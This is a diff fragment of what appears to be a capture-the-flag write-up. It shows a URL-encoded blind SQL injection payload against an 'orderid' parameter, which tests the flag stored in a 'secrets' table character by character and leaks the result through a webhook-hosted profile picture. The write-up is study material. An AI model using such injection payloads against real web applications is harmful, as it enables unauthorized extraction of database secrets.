@@ -28,7 +28,7 @@ window.open to open the page then if the character is correct we will get **<60*
 **2.** In profile page will change our profile picture to a webhook if it got any hit then it write to another file 
 ```
 /panel?orderid='+union+select+1,(CASE+WHEN+((selec
-t+count(*)+from+secrets+where+flag+like+'ASIS{%')>
+t+count(*)+from+secrets+where+flag+like+'ASIS%7b%')>
 0)+THEN+0x3203c6f7264657220757569643d2231333337222
 07473746172743d22313630373638333938362220646573637
 2697074696f6e3d22414141414141414141414141412220737
